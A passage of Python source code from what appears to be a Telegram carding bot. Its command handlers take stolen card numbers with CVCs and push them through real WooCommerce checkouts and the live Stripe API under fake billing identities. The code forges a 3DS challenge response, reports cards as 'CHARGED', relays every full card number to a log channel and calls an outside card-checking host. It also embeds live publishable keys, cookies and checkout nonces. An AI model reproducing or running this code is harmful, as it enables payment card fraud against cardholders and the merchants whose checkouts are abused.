                'sbjs_current_add': 'fd%3D2025-07-23%2000%3A50%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.dairlab.com%2Fen%2Fcheckout-2%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fshop.dairlab.com%2Fen%2Fcart%2F',
                'sbjs_first_add': 'fd%3D2025-07-23%2000%3A50%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.dairlab.com%2Fen%2Fcheckout-2%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fshop.dairlab.com%2Fen%2Fcart%2F',
                'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
                'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
                'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2015%3B%20SM-X216B%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F107.0.0.0%20Safari%2F537.36',
                'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fshop.dairlab.com%2Fen%2Fcheckout-2%2F',
                'wp-wpml_current_language': 'en',
                'pys_session_limit': 'true',
                'pys_start_session': 'true',
                'last_pys_landing_page': 'https://shop.dairlab.com/en/checkout-2/',
                '_iub_cs-55879968': '%7B%22timestamp%22%3A%222025-07-22T15%3A05%3A07.226Z%22%2C%22version%22%3A%221.82.0%22%2C%22purposes%22%3A%7B%221%22%3Atrue%2C%223%22%3Atrue%2C%224%22%3Atrue%2C%225%22%3Atrue%7D%2C%22id%22%3A55879968%2C%22cons%22%3A%7B%22rand%22%3A%22968f3f%22%7D%7D',
                'usprivacy': '%7B%22uspString%22%3A%221YN-%22%2C%22firstAcknowledgeDate%22%3A%222025-07-22T15%3A05%3A03.587Z%22%2C%22optOutDate%22%3Anull%7D',
                '_iub_previous_preference_id': '%7B%2255879968%22%3A%222025%2F07%2F22%2F15%2F05%2F07%2F226%2F968f3f%22%7D',
                '_iub_cs-55879968-uspr': '%7B%22s%22%3Atrue%2C%22sh%22%3Atrue%2C%22adv%22%3Atrue%7D',
                '_clck': 'chprdb%7C2%7Cfxu%7C0%7C2029',
                '_gcl_au': '1.1.39723286.1753196702.670944567.1753233890.1753233890',
                '_ga_C2ZLCKEYMD': 'GS2.1.s1753233645$o2$g1$t1753234052$j60$l0$h0',
            }

            headers = {
                'authority': 'shop.dairlab.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://shop.dairlab.com',
                'referer': 'https://shop.dairlab.com/en/checkout-2/',
                'user-agent': 'Mozilla/5.0 (Linux; Android 15; SM-X216B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            params = {
                'wc-ajax': 'checkout',
            }

            data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Fshop.dairlab.com%2Fen%2Fcart%2F&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fshop.dairlab.com%2Fen%2Fcheckout-2%2F&wc_order_attribution_session_start_time=2025-07-23+00%3A50%3A36&wc_order_attribution_session_pages=1&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Linux%3B+Android+15%3B+SM-X216B)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F107.0.0.0+Safari%2F537.36&billing_first_name=Habud&billing_last_name=Kus&billing_country=FI&billing_address_1=Rantakyl%C3%A4nkatu+2&billing_address_2=&billing_postcode=80160&billing_city=Lobe+&billing_state=&billing_phone=013+2635544&billing_email=gecodo9246%40mvpmedix.com&shipping_first_name=&shipping_last_name=&shipping_country=FI&shipping_address_1=&shipping_address_2=&shipping_postcode=&shipping_city=&shipping_state=&order_comments=&shipping_method%5B0%5D=free_shipping%3A2&lang=en&payment_method=stripe_cc&stripe_cc_token_key={payment_id}&stripe_cc_payment_intent_key=&terms=on&terms-field=1&woocommerce-process-checkout-nonce=2430687dcb&_wp_http_referer=%2Fen%2F%3Fwc-ajax%3Dupdate_order_review&pys_utm=utm_source%3Aundefined%7Cutm_medium%3Aundefined%7Cutm_campaign%3Aundefined%7Cutm_term%3Aundefined%7Cutm_content%3Aundefined&pys_utm_id=fbadid%3Aundefined%7Cgadid%3Aundefined%7Cpadid%3Aundefined%7Cbingid%3Aundefined&pys_browser_time=06-07%7CWednesday%7CJuly&pys_landing=https%3A%2F%2Fshop.dairlab.com%2Fen%2Fshop%2F&pys_source=shop.dairlab.com&pys_order_type=normal&last_pys_landing=https%3A%2F%2Fshop.dairlab.com%2Fen%2Fshop%2F&last_pys_source=shop.dairlab.com&last_pys_utm=utm_source%3Aundefined%7Cutm_medium%3Aundefined%7Cutm_campaign%3Aundefined%7Cutm_term%3Aundefined%7Cutm_content%3Aundefined&last_pys_utm_id=fbadid%3Aundefined%7Cgadid%3Aundefined%7Cpadid%3Aundefined%7Cbingid%3Aundefined'

            response = requests.post(
                'https://shop.dairlab.com/en/',
                params=params,
                cookies=cookies,
                headers=headers,
                data=data
            )
            
            elapsed = time.time() - start_time
            response_text = response.text
            response_json = response.json()
            brand, bank, country = get_bin_info(cc[:6])
            
            # Log full response to channel
            await client.send_message(
                LOG_CHANNEL_ID,
                f"🔵 Stripe Final Response:\n"
                f"Card: {cc}|{mnt}|{yr}|{cvc}\n"
                f"Response: {response_text}\n"
                f"Gateway: Stripe [30$]"
            )
            
            if response_json.get("result") == "failure":
                # Extract error message from HTML response
                error_msg = "Unknown error"
                if "messages" in response_json:
                    error_html = response_json["messages"]
                    error_match = re.search(r'<li>(.*?)<\/li>', error_html)
                    if error_match:
                        error_msg = error_match.group(1).strip()
                
                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
                result_msg = error_msg
            else:
                status = "APPROVED ✅️"
                result_msg = "30$ CHARGED ✅️✅️👌"

            result_text = (
                f"┏━━━━━━━⍟\n"
                f"┃ {status}\n"
                f"┗━━━━━━━━━━━⊛\n\n"
                f"⌯ 𝗖𝗮𝗿𝗱\n   ↳ <code>{cc}|{mnt}|{yr}|{cvc}</code>\n"
                f"⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ Stripe [30$] \n"
                f"⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ {result_msg}\n\n"
                f"⌯ 𝗜𝗻𝗳𝗼 ➳ {brand}\n"
                f"⌯ 𝐈𝐬𝐬𝐮𝐞𝐫 ➳ {bank}\n"
                f"⌯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {country}\n\n"
                f"⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➳ @{message.from_user.username or message.from_user.id}\n"
                f"⌯ 𝐃𝐞𝐯 ⌁ @andr0idpie9\n"
                f"⌯ 𝗧𝗶𝗺𝗲 ➳ {elapsed:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
            )
            
            await proc_msg.edit(result_text, parse_mode=ParseMode.HTML)
            await log_to_channel(client, "CC", message, cc_details, status)
            
        except Exception as e:
            elapsed = time.time() - start_time
            brand, bank, country = get_bin_info(cc[:6])
            
            # Log error to channel
            await client.send_message(
                LOG_CHANNEL_ID,
                f"🔴 Stripe Check Error:\n"
                f"Card: {cc}|{mnt}|{yr}|{cvc}\n"
                f"Error: {str(e)}\n"
                f"Gateway: Stripe [30$]"
            )
            
            result_text = (
                f"┏━━━━━━━⍟\n"
                f"┃ ERROR ⚠️\n"
                f"┗━━━━━━━━━━━⊛\n\n"
                f"⌯ 𝗖𝗮𝗿𝗱\n   ↳ <code>{cc}|{mnt}|{yr}|{cvc}</code>\n"
                f"⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ Stripe [30$] \n"
                f"⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ {str(e)}\n\n"
                f"⌯ 𝗜𝗻𝗳𝗼 ➳ {brand}\n"
                f"⌯ 𝐈𝐬𝐬𝐮𝐞𝐫 ➳ {bank}\n"
                f"⌯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {country}\n\n"
                f"⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➳ @{message.from_user.username or message.from_user.id}\n"
                f"⌯ 𝐃𝐞𝐯 ⌁ @andr0idpie9\n"
                f"⌯ 𝗧𝗶𝗺𝗲 ➳ {elapsed:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"
            )
            
            await proc_msg.edit(result_text, parse_mode=ParseMode.HTML)
            await log_to_channel(client, "CC", message, cc_details, f"Error: {str(e)}")
            
    except Exception as e:
        await message.reply(f"❌ Error processing command: {str(e)}")
        if 'proc_msg' in locals():
            await proc_msg.delete()

# === SX Command Handler (Stripe Extended) ===
@app.on_message(filters.command("sx", prefixes="/"))
async def stripe_extended_handler(client: Client, message: Message):
    try:
        # Check if CC is provided
        if len(message.text.split()) < 2:
            await message.reply("❗ Please provide a CC in format: /sx 4889506069819153|07|28|367")
            return

        # Extract CC details  
        cc_details = message.text.split()[1]  
        if not re.match(r"\d{16}\|\d{2}\|\d{2,4}\|\d{3}", cc_details):  
            await message.reply("❗ Invalid CC format. Use: `/sx 4889506069819153|07|28|367`")  
            return  

        cc, mnt, yr, cvc = cc_details.split("|")  
        
        # Send processing message  
        proc_msg = await message.reply("↯ Checking card via Stripe Extended [50$]...")  

        start_time = time.time()  
        highest_step = 0  
        response_msg = ""  
        status = ""  

        try:  
            # Step 1: Create payment method  
            highest_step = 1  
            step1_headers = {  
                'authority': 'api.stripe.com',  
                'accept': 'application/json',  
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',  
                'content-type': 'application/x-www-form-urlencoded',  
                'origin': 'https://js.stripe.com',  
                'referer': 'https://js.stripe.com/',  
                'user-agent': 'Mozilla/5.0 (Linux; Android 15; SM-X216B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',  
            }  

            step1_data = {  
                'billing_details[name]': 'Habuda Kus',  
                'billing_details[email]': 'gecodo9246@mvpmedix.com',  
                'billing_details[phone]': '(701) 747-7116',  
                'billing_details[address][city]': 'Waxahachie',  
                'billing_details[address][country]': 'US',  
                'billing_details[address][line1]': '7481 Depaul Dr',  
                'billing_details[address][line2]': '',  
                'billing_details[address][postal_code]': '96088',  
                'billing_details[address][state]': 'CA',  
                'type': 'card',  
                'card[number]': cc,  
                'card[cvc]': cvc,  
                'card[exp_year]': yr,  
                'card[exp_month]': mnt,  
                'allow_redisplay': 'unspecified',  
                'payment_user_agent': 'stripe.js/2e00b582bb; stripe-js-v3/2e00b582bb; payment-element; deferred-intent',  
                'referrer': 'https://pixelpixiedesigns.com',  
                'time_on_page': '354956',  
                'client_attribution_metadata[client_session_id]': '4249fdbd-f99f-49ae-9ea4-e9598d191335',  
                'client_attribution_metadata[merchant_integration_source]': 'elements',  
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',  
                'client_attribution_metadata[merchant_integration_version]': '2021',  
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',  
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',  
                'client_attribution_metadata[elements_session_config_id]': 'df3c7d9b-7999-453a-a155-8f64610eea34',  
                'guid': 'b0a880a3-2d6a-4f1b-9d41-c642633891d6d4bc48',  
                'muid': '34cf78ad-79d2-4231-a290-9052fa3fef8ec70986',  
                'sid': 'c4b3bad5-aa14-4b99-a6d3-c98d11a16c248057b3',  
                'key': 'pk_live_51LJl65B08TEtBtCNwSyzL6BRAZ4Bazjtdck14aMTEAdFZXc2hgrYIhaQ32OhMpmYDnOTP6unqHPQ5mxusxPCrcoE00C7rufDiF',  
                '_stripe_version': '2024-06-20',  
            }  

            step1_response = requests.post(  
                'https://api.stripe.com/v1/payment_methods',  
                headers=step1_headers,  
                data=step1_data,  
                timeout=30  
            )  
            step1_json = step1_response.json()  

            if 'error' in step1_json:  
                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"  
                response_msg = step1_json.get('error', {}).get('message', 'Unknown error from Step 1')  
                raise Exception(response_msg)  

            payment_method_id = step1_json['id']  
            
            # Log step 1 to channel  
            await client.send_message(  
                LOG_CHANNEL_ID,  
                f"🔵 Stripe Extended Step 1:\n"  
                f"Card: {cc}|{mnt}|{yr}|{cvc}\n"  
                f"Response: {step1_response.text}\n"  
                f"Gateway: Stripe Extended [50$]"  
            )  

            # Step 2: Process checkout  
            highest_step = 2  
            cookies = {  
                'sbjs_migrations': '1418474375998%3D1',  
                'sbjs_current_add': 'fd%3D2025-07-23%2007%3A22%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fpixelpixiedesigns.com%2F%7C%7C%7Crf%3D%28none%29',  
                'sbjs_first_add': 'fd%3D2025-07-23%2007%3A22%3A25%7C%7C%7Cep%3Dhttps%3A%2F%2Fpixelpixiedesigns.com%2F%7C%7C%7Crf%3D%28none%29',  
                'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',  
                'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',  
                'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2015%3B%20SM-X216B%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F107.0.0.0%20Safari%2F537.36',  
                '_ga': 'GA1.1.481680961.1753257146',  
                'woocommerce_items_in_cart': '1',  
                'woocommerce_cart_hash': 'cc1ec249d3329514e6f0b421ac45bc6a',  
                'wp_woocommerce_session_00f187d60e01119a9192a1c1cc27dc99': 't_9641e31f8f6c4e005166a2c7eaa881%7C1753430006%7C1753343606%7C%24generic%24MXxbb2-s3-d6lNUouJ1LlUipkNbaO5WXv6_G-zKB',  
                '__stripe_mid': '34cf78ad-79d2-4231-a290-9052fa3fef8ec70986',  
                '__stripe_sid': 'c4b3bad5-aa14-4b99-a6d3-c98d11a16c248057b3',  
                'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fpixelpixiedesigns.com%2Fcheckout%2F',  
                '_ga_2PCHPGKEXB': 'GS2.1.s1753257145$o1$g1$t1753257227$j39$l0$h0'  
            }  

            step2_headers = {  
                'authority': 'pixelpixiedesigns.com',  
                'accept': 'application/json, text/javascript, */*; q=0.01',  
                'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',  
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',  
                'origin': 'https://pixelpixiedesigns.com',  
                'referer': 'https://pixelpixiedesigns.com/checkout/',  
                'user-agent': 'Mozilla/5.0 (Linux; Android 15; SM-X216B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',  
                'x-requested-with': 'XMLHttpRequest',  
            }  

            step2_data = {  
                'wc_order_attribution_source_type': 'typein',  
                'wc_order_attribution_referrer': '(none)',  
                'wc_order_attribution_utm_campaign': '(none)',  
                'wc_order_attribution_utm_source': '(direct)',  
                'wc_order_attribution_utm_medium': '(none)',  
                'wc_order_attribution_utm_content': '(none)',  
                'wc_order_attribution_utm_id': '(none)',  
                'wc_order_attribution_utm_term': '(none)',  
                'wc_order_attribution_utm_source_platform': '(none)',  
                'wc_order_attribution_utm_creative_format': '(none)',  
                'wc_order_attribution_utm_marketing_tactic': '(none)',  
                'wc_order_attribution_session_entry': 'https://pixelpixiedesigns.com/',  
                'wc_order_attribution_session_start_time': '2025-07-23 07:22:25',  
                'wc_order_attribution_session_pages': '8',  
                'wc_order_attribution_session_count': '1',  
                'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 15; SM-X216B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',  
                'billing_first_name': 'Habuda',  
                'billing_last_name': 'Kus',  
                'billing_country': 'US',  
                'billing_address_1': '7481 Depaul Dr',  
                'billing_address_2': '',  
                'billing_city': 'Waxahachie',  
                'billing_state': 'CA',  
                'billing_phone': '(701) 747-7116',  
                'billing_postcode': '96088',  
                'billing_email': 'gecodo9246@mvpmedix.com',  
                'account_username': '',  
                'order_comments': '',  
                'payment_method': 'stripe',  
                'wc-stripe-payment-method-upe': '',  
                'wc_stripe_selected_upe_payment_type': '',  
                'wc-stripe-is-deferred-intent': '1',  
                'stripe_klarna_token_key': '',  
                'stripe_klarna_payment_intent_key': '',  
                'ppcp_paypal_order_id': '',  
                'ppcp_payment_token': '',  
                'ppcp_billing_token': '',  
                'stripe_afterpay_token_key': '',  
                'stripe_afterpay_payment_intent_key': '',  
                'woocommerce-process-checkout-nonce': '57fa512c02',  
                '_wp_http_referer': '/?wc-ajax=update_order_review',  
                'wc-stripe-payment-method': payment_method_id  
            }  

            step2_response = requests.post(  
                'https://pixelpixiedesigns.com/?wc-ajax=checkout',  
                headers=step2_headers,  
                cookies=cookies,  
                data=step2_data,  
                timeout=30  
            )  
            step2_json = step2_response.json()  

            # Log step 2 to channel  
            await client.send_message(  
                LOG_CHANNEL_ID,  
                f"🔵 Stripe Extended Step 2:\n"  
                f"Card: {cc}|{mnt}|{yr}|{cvc}\n"  
                f"Response: {step2_response.text}\n"  
                f"Gateway: Stripe Extended [50$]"  
            )  

            if step2_json.get("result") == "failure":  
                error_html = step2_json.get("messages", "")  
                # Improved error message extraction
                error_match = re.search(r'<li>(.*?)(?:\t|</li>)', error_html)
                if error_match:
                    error_msg = error_match.group(1).strip()
                    # Clean up common HTML entities and extra spaces
                    error_msg = error_msg.replace('&nbsp;', ' ').replace('\t', ' ').strip()
                    error_msg = ' '.join(error_msg.split())  # Remove extra spaces
                else:
                    error_msg = "Unknown error from Step 2"
                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"  
                response_msg = error_msg  
                raise Exception(error_msg)  

            if 'data' not in step2_json or 'redirect' not in step2_json['data']:  
                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"  
                response_msg = "Unexpected response from Step 2"  
                raise Exception(response_msg)  

            redirect_url = step2_json['data']['redirect']  
            payment_intent_id = redirect_url.split('/')[-1]  

            # Step 3: Confirm payment intent  
            highest_step = 3  
            step3_headers = step1_headers.copy()  
            
            step3_data = {  
                'use_stripe_sdk': 'true',  
                'mandate_data[customer_acceptance][type]': 'online',  
                'mandate_data[customer_acceptance][online][infer_from_client]': 'true',  
                'key': 'pk_live_51LJl65B08TEtBtCNwSyzL6BRAZ4Bazjtdck14aMTEAdFZXc2hgrYIhaQ32OhMpmYDnOTP6unqHPQ5mxusxPCrcoE00C7rufDiF',  
                '_stripe_version': '2024-06-20',  
                'client_secret': f'{payment_intent_id}_secret_g8xpRlCJvEoi8KEBx4oq8Jhjq'  
            }  

            step3_response = requests.post(  
                f'https://api.stripe.com/v1/payment_intents/{payment_intent_id}/confirm',  
                headers=step3_headers,  
                data=step3_data,  
                timeout=30  
            )  
            step3_json = step3_response.json()  

            # Log step 3 to channel  
            await client.send_message(  
                LOG_CHANNEL_ID,  
                f"🔵 Stripe Extended Step 3:\n"  
                f"Card: {cc}|{mnt}|{yr}|{cvc}\n"  
                f"Response: {step3_response.text}\n"  
                f"Gateway: Stripe Extended [50$]"  
            )  

            if 'error' in step3_json:  
                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"  
                response_msg = step3_json.get('error', {}).get('message', 'Unknown error from Step 3')  
                raise Exception(response_msg)  

            if 'next_action' not in step3_json or step3_json['next_action']['type'] != 'use_stripe_sdk':  
                status = "APPROVED ✅️"  
                response_msg = "50$ CHARGED ✅️✅️👌"  
                raise Exception("Payment completed without 3DS")  

            # Step 4: 3DS Authentication  
            highest_step = 4  
            source = step3_json['next_action']['use_stripe_sdk']['source']  
            
            step4_data = {  
                'source': source,  
                'browser': json.dumps({  
                    "fingerprintAttempted": True,  
                    "fingerprintData": '{"threeDSServerTransID":"0a95f062-9772-4664-a735-4aad68dcb800"}',  
                    "challengeWindowSize": None,  
                    "threeDSCompInd": "Y",  
                    "browserJavaEnabled": False,  
                    "browserJavascriptEnabled": True,  
                    "browserLanguage": "en-IN",  
                    "browserColorDepth": "24",  
                    "browserScreenHeight": "1280",  
                    "browserScreenWidth": "800",  
                    "browserTZ": "-330",  
                    "browserUserAgent": "Mozilla/5.0 (Linux; Android 15; SM-X216B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"  
                }),  
                'one_click_authn_device_support[hosted]': 'false',  
                'one_click_authn_device_support[same_origin_frame]': 'false',  
                'one_click_authn_device_support[spc_eligible]': 'false',  
                'one_click_authn_device_support[webauthn_eligible]': 'false',  
                'one_click_authn_device_support[publickey_credentials_get_allowed]': 'true',  
                'key': 'pk_live_51LJl65B08TEtBtCNwSyzL6BRAZ4Bazjtdck14aMTEAdFZXc2hgrYIhaQ32OhMpmYDnOTP6unqHPQ5mxusxPCrcoE00C7rufDiF',  
                '_stripe_version': '2024-06-20'  
            }  

            step4_response = requests.post(  
                'https://api.stripe.com/v1/3ds2/authenticate',  
                headers=step3_headers,  
                data=step4_data,  
                timeout=30  
            )  
            step4_json = step4_response.json()  

            # Log step 4 to channel  
            await client.send_message(  
                LOG_CHANNEL_ID,  
                f"🔵 Stripe Extended Step 4:\n"  
                f"Card: {cc}|{mnt}|{yr}|{cvc}\n"  
                f"Response: {step4_response.text}\n"  
                f"Gateway: Stripe Extended [50$]"  
            )  

            if 'error' in step4_json:  
                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"  
                response_msg = step4_json.get('error', {}).get('message', 'Unknown error from Step 4')  
                raise Exception(response_msg)  

            # Step 5: Complete 3DS Challenge  
            highest_step = 5  
            step5_data = {  
                'source': source,  
                'final_cres': json.dumps({  
                    "messageType": "Erro",  
                    "messageVersion": "2.2.0",  
                    "threeDSServerTransID": "0a95f062-9772-4664-a735-4aad68dcb800",  
                    "errorCode": "403",  
                    "errorDescription": "Transient system failure",  
                    "errorDetail": "An unexpected error occurred!",  
                    "acsTransID": "89ecdd9e-4ce6-49ef-8d7c-73ffe6673efc",  
                    "dsTransID": "5bc7bedf-06cc-46c8-9948-35f5c2e87e68",  
                    "errorComponent": "A",  
                    "errorMessageType": "CReq"  
                }),  
                'key': 'pk_live_51LJl65B08TEtBtCNwSyzL6BRAZ4Bazjtdck14aMTEAdFZXc2hgrYIhaQ32OhMpmYDnOTP6unqHPQ5mxusxPCrcoE00C7rufDiF',  
                '_stripe_version': '2024-06-20'  
            }  

            step5_response = requests.post(  
                'https://api.stripe.com/v1/3ds2/challenge_complete',  
                headers=step3_headers,  
                data=step5_data,  
                timeout=30  
            )  
            step5_json = step5_response.json()  

            # Log step 5 to channel  
            await client.send_message(  
                LOG_CHANNEL_ID,  
                f"🔵 Stripe Extended Step 5:\n"  
                f"Card: {cc}|{mnt}|{yr}|{cvc}\n"  
                f"Response: {step5_response.text}\n"  
                f"Gateway: Stripe Extended [50$]"  
            )  

            if 'error' in step5_json:  
                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"  
                response_msg = step5_json.get('error', {}).get('message', 'Unknown error from Step 5')  
            else:  
                status = "APPROVED ✅️"  
                response_msg = "50$ CHARGED ✅️✅️👌"  

        except Exception as e:  
            if not status:  
                status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"  
            if not response_msg:  
                response_msg = str(e)  

        elapsed = time.time() - start_time  
        brand, bank, country = get_bin_info(cc[:6])  

        result_text = (  
            f"┏━━━━━━━⍟\n"  
            f"┃ {status}\n"  
            f"┗━━━━━━━━━━━⊛\n\n"  
            f"⌯ 𝗖𝗮𝗿𝗱\n   ↳ <code>{cc}|{mnt}|{yr}|{cvc}</code>\n"  
            f"⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ Stripe Extended [50$] \n"  
            f"⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ {response_msg}\n"  
            f"⌯ 𝐇𝐢𝐠𝐡𝐞𝐬𝐭 𝐒𝐭𝐞𝐩 ➳ {highest_step}\n\n"  
            f"⌯ 𝗜𝗻𝗳𝗼 ➳ {brand}\n"  
            f"⌯ 𝐈𝐬𝐬𝐮𝐞𝐫 ➳ {bank}\n"  
            f"⌯ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {country}\n\n"  
            f"⌯ 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➳ @{message.from_user.username or message.from_user.id}\n"  
            f"⌯ 𝐃𝐞𝐯 ⌁ @andr0idpie9\n"  
            f"⌯ 𝗧𝗶𝗺𝗲 ➳ {elapsed:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"  
        )  

        await proc_msg.edit(result_text, parse_mode=ParseMode.HTML)  
        await log_to_channel(client, "CC", message, cc_details, f"{status} - Step {highest_step}")  

    except Exception as e:  
        await message.reply(f"❌ Error processing command: {str(e)}")  
        if 'proc_msg' in locals():  
            await proc_msg.delete()

# === CC Check Handler ===
@app.on_message(filters.text & filters.regex(CC_REGEX))
async def check_card(client: Client, message: Message):
    match = re.search(CC_REGEX, message.text)
    if not match:
        await message.reply("Invalid format. Use: `/chk xxxxxxxxxxxxxxxx|MM|YYYY|CVV`")
        return

    card = match.group(1)
    bin_code = card[:6]

    # Send initial "processing" message
    proc_msg = await message.reply_text(
        f"↯ Checking..\n\n"
        f"⌯ 𝐂𝐚𝐫𝐝 - <code>{card}</code>\n"
        f"⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 - <code>Stripe Charge</code>\n"
        f"⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - Processing"
    )

    start_time = time.time()

    try:
        headers = {
            'authority': 'takeshi-j8i9.onrender.com',
            'accept': '*/*',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://takeshi-j8i9.onrender.com',
            'referer': 'https://takeshi-j8i9.onrender.com/',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; SM-X216B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
        }

        json_data = {
            'card': card,
            'site_id': None,
            'gateway': 'stripe_charge',
        }

        response = requests.post(
            'https://takeshi-j8i9.onrender.com/check_card',
            headers=headers,
            json=json_data,
            timeout=3000
        )
        
        elapsed = round(time.time() - start_time, 2)
        response_json = response.json()
        
        if "status" in response_json and response_json["status"].lower() == "declined":
            status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
            response_text = response_json.get("message", "Card declined")
        else:
            status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
            response_text = response_json.get("message", "Card approved")

    except Exception as e:
        await proc_msg.edit(f"❌ Error: {str(e)}")
        return

    brand, bank, country = get_bin_info(bin_code)

    final_msg = (
        f"┏━━━━━━━⍟\n"
        f"┃ {status}\n"
        f"┗━━━━━━━━━━━⊛\n\n"
        f"⌯ 𝗖𝗮𝗿𝗱\n   ↳ <code>{card}</code>\n"
        f"⌯ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➳ Stripe Charge\n"
        f"⌯ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➳ <code>{response_text}</code>\n\n"
